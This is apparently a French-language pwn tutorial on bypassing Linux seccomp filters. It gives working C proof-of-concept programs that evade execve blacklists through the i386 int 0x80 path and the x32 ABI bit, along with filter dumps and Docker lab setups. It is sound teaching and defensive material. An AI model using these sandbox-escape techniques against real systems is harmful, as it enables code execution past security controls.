---
title: Partie 27 - Seccomp - exploitation et stratégies de contournement (2/2)
date: 2026-04-12 10:00:00
categories: [Pwn, Introduction au pwn]
tags: [x86, pwn, linux]     # TAG names should always be lowercase
author: kabeche
toc: true
---

# Seccomp : exploitation et stratégies de contournement (2/2)

A présent que les choses sont plus claires à propos du fonctionnement du filtrage **seccomp**, il est temps de voir comment exploiter des programmes qui l'utilisent.

> Au cours de ce chapitre, il ne sera pas nécessaire de comprendre comment est mis en place le **filtre BPF** depuis le code source du programme étant donné que l'on tentera de l'extraire systématiquement avec `seccomp-tools`.
> 
> Et puis en temps normal nous n'avons que très rarement accès au code source 🙃.
{: .prompt-tip }

## ⚠️ Erreur n°1 : ne pas filtrer de manière exhaustive

Erreur de débutant mais qui peut arriver ... Par exemple, le programme à exploiter bloque l'utilisation de `execve`, mais pas celui de l'appel système [execveat](https://man7.org/linux/man-pages/man2/execveat.2.html) ? Même chose avec `open` et [openat](https://linux.die.net/man/2/openat).

> Au passage, si le chemin spécifié comme argument à `execveat`/`openat` est un **chemin absolu**, alors le premier argument `dirfd` n'est pas utilisé et cela **revient quasiment à appeler** `execve`/`open`. 
{: .prompt-tip }

### 💻 Comment exploiter une telle vulnérabilité ?

De manière générale, il faut toujours se poser la question suivante : si une action m’est interdite via un appel système donné, est-il possible d’atteindre **le même résultat** en utilisant un **autre appel système**, ou en combinant **plusieurs appels système** autorisés ?

Voici une petite liste, non exhaustive, de quelques appels système qui peuvent être utiles lors de l'exploitation s'ils ne sont pas filtrés :

- `mprotect`, `mmap` ... ;
- `fork`, `clone` ... ;
- `ptrace` ;
- `rt_sigreturn`.

Ces fonctions permettent généralement d'avoir plus de **marge de manœuvre** pour exploiter un programme.

## ⚠️ Erreur n°2 : ne pas vérifier l'architecture utilisée

Dans le filtre utilisé par **chromium** que l'on avait extrait lors du précédent chapitre, nous pouvons lire les lignes suivantes :

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 
 0001: 0x15 0x00 0x12 0xc000003e  if (A != ARCH_X86_64) goto 0020
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 (...)
 0005: 0x15 0x00 0x03 0x00000125  if (A != pipe2) goto 0009
 
 
 (...)
 
 
 0020: 0x15 0x00 0x0d 0x40000003  if (A != ARCH_I386) goto 0034
 0021: 0x20 0x00 0x00 0x00000000  A = sys_number
 0022: 0x15 0x00 0x03 0x0000014b  if (A != i386.pipe2) goto 0026
 
 
 (...)
 0034: 0x06 0x00 0x00 0x00000000  return KILL
```

Nous remarquons qu'il y a deux blocs qui semblent faire la même chose : **contrôler l'exécution de l'appel système** `pipe2`. 

> Mais pourquoi faire deux fois la même vérification ?
{: .prompt-info }

En fait ce n'est **pas exactement** la même vérification. La première vérification est réalisée lorsque l'architecture de l'appel système (déclenché via `syscall`) est `x64` tandis que la seconde est réalisée lorsque l'architecture de l'appel système (déclenché via `int 0x80`) est `x86`. D’ailleurs, la documentation officielle du noyau Linux [met explicitement en garde](https://www.kernel.org/doc/html/v4.13/userspace-api/seccomp_filter.html#pitfalls) contre l’absence de vérification de l’architecture, celle-ci étant une source classique de contournement des filtres **seccomp**.

Bah oui ! En ayant la possibilité d'exécuter un *shellcode* (ou en faisant du ROP) de manière arbitraire, des petits malins pourraient être tentés d'exécuter l'appel système `pipe2` en utilisant `int 0x80`, ce qui fonctionne même dans les programmes 64 bits 🤓.

### 💻 Comment exploiter une telle vulnérabilité ?

Notre ami Cheikh GPT nous a fait l'honneur d'écrire ce programme pour illustrer l'exploitation de ce type d'erreur :

```cpp
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <stddef.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <sys/prctl.h>
#include <sys/syscall.h>

static void install_seccomp(void)
{
    struct sock_filter filter[] = {
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS,
                 offsetof(struct seccomp_data, nr)),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_execve, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
    };

    struct sock_fprog prog = {
        .len = sizeof(filter) / sizeof(filter[0]),
        .filter = filter,
    };

    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
    syscall(SYS_seccomp, SECCOMP_SET_MODE_FILTER, 0, &prog);
}

static void *low_alloc(size_t sz)
{
    void *p = mmap(NULL, sz,
                   PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS | MAP_32BIT,
                   -1, 0);
    if (p == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }
    return p;
}

int main(void)
{
    setbuf(stdout, NULL);

    puts("[+] Installation du filtre seccomp (execve x86-64 interdit)");
    install_seccomp();
    puts("[+] Filtre installe");
    puts("[+] execve via int 0x80 (ABI i386 depuis ELF64)");

    // --------------- Partie Exploitation ---------------
    /* allocation basse (32 bits) */
    char *path = low_alloc(32);
    strcpy(path, "/usr/bin/id");

    char **argv = low_alloc(2 * sizeof(char *));
    argv[0] = path;
    argv[1] = NULL;

    char **envp = low_alloc(sizeof(char *));
    envp[0] = NULL;

    asm volatile (
        "movl $11, %%eax\n"     /* __NR_execve i386 */
        "movl %k0, %%ebx\n"
        "movl %k1, %%ecx\n"
        "movl %k2, %%edx\n"
        "int $0x80\n"
        :
        : "r"(path), "r"(argv), "r"(envp)
        : "eax", "ebx", "ecx", "edx", "memory"
    );
   // ----------------------------------------------------
    perror("execve");
    return 1;
}
```

Accès au conteneur Docker :

- ⬇️ **Téléchargement** : [pwn-seccomp-exemple-2.zip](https://drive.proton.me/urls/GR8V1BQEKW#6pmyGPHjbG5X)
- 🔎 **SHA256 & Analyse Virus Total** : [cedcbcf7f43e5e8b666501123ae1d85a2791dd6c4e537405080e800fadb7e4ce](https://www.virustotal.com/gui/file/cedcbcf7f43e5e8b666501123ae1d85a2791dd6c4e537405080e800fadb7e4ce)
- ⚙️ **Construction et lancement du conteneur** :

```sh
docker build -t pwn-seccomp-exemple-2 .

docker run -it --rm -p 1234:1234 --cap-add=SYS_PTRACE --security-opt seccomp=unconfined pwn-seccomp-exemple-2
```

Compilons-le avec `gcc main.c -o exe` et jetons un œil au filtre **seccomp** utilisé :

```sh
$ seccomp-tools dump ./exe

[+] Installation du filtre seccomp (execve x86-64 interdit)
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0003
 0002: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0003: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

Vu comme ça on a l'impression qu'il n'est, effectivement, pas possible d'exécuter `execve`. Enfin, apparemment 😏. Pourtant en exécutant le programme (qui s'auto-exploite 🤪), `execve("/usr/bin/id",(...),(...))` semble bien **être exécuté** :

```sh
$ ./exe

[+] Installation du filtre seccomp (execve x86-64 interdit)
[+] Filtre installe
[+] execve via int 0x80 (ABI i386 depuis ELF64)
uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),101(lxd),988(docker)
```

En effet, dans le programme l'appel système `execve` est réalisée de la sorte :

```cpp
asm volatile (
	"movl $11, %%eax\n"     /* __NR_execve i386 */
	"movl %k0, %%ebx\n"
	"movl %k1, %%ecx\n"
	"movl %k2, %%edx\n"
	"int $0x80\n"
	:
	: "r"(path), "r"(argv), "r"(envp)
	: "eax", "ebx", "ecx", "edx", "memory"
);
```

Étant donné que l'appel système `execve` utilisé est celui de l'architecture `x86` avec `int 0x80`, il passe entre les mailles du filtre **seccomp** 🫣 !

## ⚠️ Erreur n°3 : ne pas vérifier l'ABI x32

Tout d'abord, voyons ce qu'est **l'ABI x32**. Nous y reviendrons plus tard lors de l'étude de l'exploitation du tas.

L’**ABI x32** est une interface d’exécution un peu particulière apparue sur les systèmes Linux x86-64 : elle combine des **registres 64 bits** avec des **pointeurs 32 bits**. L’idée, à l’origine, était de profiter des performances de l’architecture 64 bits (instructions, registres, appels système modernes) tout en réduisant la consommation mémoire grâce à des pointeurs plus petits. 

Concrètement, un programme **x32** utilise les **numéros d’appels système x86-64**, mais marqués par un **bit spécial** (`0x40000000`) pour indiquer au noyau qu’il s’agit de l’ABI x32. Peu utilisé et source de complexité (notamment en sécurité), cet ABI est aujourd’hui **désactivé sur la plupart des noyaux modernes**.

D'ailleurs, nous voyons bien dans le filtre **seccomp** de **chromium** que cela est vérifié :

```
 line  CODE  JT   JF      K
=================================
 (...)
 
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x1d 0xffffffff  if (A != 0xffffffff) goto 0034
 0005: 0x15 0x00 0x03 0x00000125  if (...) goto (...)
 
 (...)
 
 0034: 0x06 0x00 0x00 0x00000000  return KILL
```

### 💻 Comment exploiter une telle vulnérabilité ?

Encore une fois, merci Chat GPT pour les travaux 🤝 :

```cpp
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stddef.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <sys/prctl.h>
#include <sys/syscall.h>

/* Macros utilitaires */
#define ALLOW(syscall) \
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, syscall, 0, 1), \
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW)

#define KILL \
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS)

static void install_seccomp(void)
{
    struct sock_filter filter[] = {
        /* Charger le numero de l appel systeme */
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS,
                 offsetof(struct seccomp_data, nr)),

        /* Si le syscall est execve alors tuer le processus */
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_execve, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),

        /* Tous les autres appels systeme sont autorises */
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
    };

    struct sock_fprog prog = {
        .len = sizeof(filter) / sizeof(filter[0]),
        .filter = filter,
    };

    /* Interdire toute elevation de privileges */
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) {
        perror("PR_SET_NO_NEW_PRIVS");
        exit(1);
    }

    /* Installer le filtre seccomp */
    if (syscall(SYS_seccomp, SECCOMP_SET_MODE_FILTER, 0, &prog)) {
        perror("seccomp");
        exit(1);
    }
}

int main(void)
{
    printf("[+] Installation du filtre seccomp vulnerable\n");
    install_seccomp();
    printf("[+] Seccomp installe\n");
    
    printf("[+] Tentative de execve via l ABI x32\n");
    
    // -------------------- Partie Exploitation --------------------
    char *argv[] = {"/usr/bin/id", NULL};
    char *envp[] = {NULL};
    
    /* execve via l ABI x32 : __NR_execve | 0x40000000 */
    syscall(__NR_execve | 0x40000000, "/usr/bin/id", argv, envp);
    // -------------------------------------------------------------
    perror("execve");
    return 0;
}
```

Accès au conteneur Docker :

- ⬇️ **Téléchargement** : [pwn-seccomp-exemple-3.zip](https://drive.proton.me/urls/JK8KYHTY7W#ccXge6bFN9r0)
- 🔎 **SHA256 & Analyse Virus Total** : [b1b065d74d1a45343755b1f9346b5a3af5c716e7afc47fa3122bdbff926ad57d](https://www.virustotal.com/gui/file/b1b065d74d1a45343755b1f9346b5a3af5c716e7afc47fa3122bdbff926ad57d)
- ⚙️ **Construction et lancement du conteneur** :

```sh
docker build -t pwn-seccomp-exemple-3 .

docker run -it --rm -p 1234:1234 --cap-add=SYS_PTRACE --security-opt seccomp=unconfined pwn-seccomp-exemple-3
```

On le compile avec `gcc main.c -o exe` et affichons le filtre **seccomp** utilisé :

```
$ seccomp-tools dump ./exe

[+] Installing vulnerable seccomp filter
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0003
 0002: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0003: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

Comme ce fut le cas pour le précédent exemple, ce programme met en place un filtre vulnérable qui devrait normalement bloquer l'appel système `execve`. Néanmoins il ne vérifie pas si le numéro de l'appel système contient le bit `0x40000000`.

> En utilisant le bit `0x40000000` afin de passer par l'**ABI x32**, le numéro de l'appel système à appeler (ici `__NR_execve` ) doit avoir pour valeur le numéro de l'appel système en [64 bits](https://x64.syscall.sh/) (`0x3b` pour `execve`) et non la valeur en [32 bits](https://x86.syscall.sh/) (`0xb` pour `execve`).
{: .prompt-warning }

De ce fait, il est toujours possible d'exécuter `execve` (à condition que votre machine active l'**ABI x32**) :

```sh
$ ./exe

[+] Installation du filtre seccomp vulnerable
[+] Seccomp installe
[+] Tentative de execve via l ABI x32
uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),101(lxd),988(docker)
```

Au passage, pour savoir si **l'ABI x32** est disponible sur une machine, il suffit de lancer :

```sh
grep CONFIG_X86_X32 /boot/config-$(uname -r)
```

La commande doit être exécutée **dans l'hôte** et non dans le conteneur Docker car elle ne fonctionnera pas.

Voici deux résultats qu'il est susceptible d'avoir :

- `# CONFIG_X86_X32_ABI is not set` ➡️ l'**ABI x32** n'est pas activée ❌ ;
- `CONFIG_X86_X32=y` ➡️ l'**ABI x32** est activée ✅ .

## Est-il possible de désactiver un filtre seccomp une fois activé ❓

La réponse est : **Non**. Du moins pas en *user land*. Pour ce qui est de le désactiver depuis le *kernel land*, je ne sais pas si cela est possible.

## 📋 Synthèse

Au cours de ce chapitre, nous avons mis en évidence plusieurs **erreurs classiques** dans la mise en place des filtres **seccomp**. Cela montre à quel point il est essentiel de **lire attentivement** et **comprendre précisément** le filtre **seccomp** appliqué par une application avant d’en tirer des conclusions en termes d'exploitation.

Bien entendu, cette liste d’erreurs n’est **pas exhaustive** : d’autres failles de conception ou d’implémentation peuvent exister. Toutefois, lorsque aucune de ces erreurs courantes n’est présente, l’exploitation devient généralement **un peu plus complexe** et demande une analyse plus approfondie du programme et de son environnement d’exécution.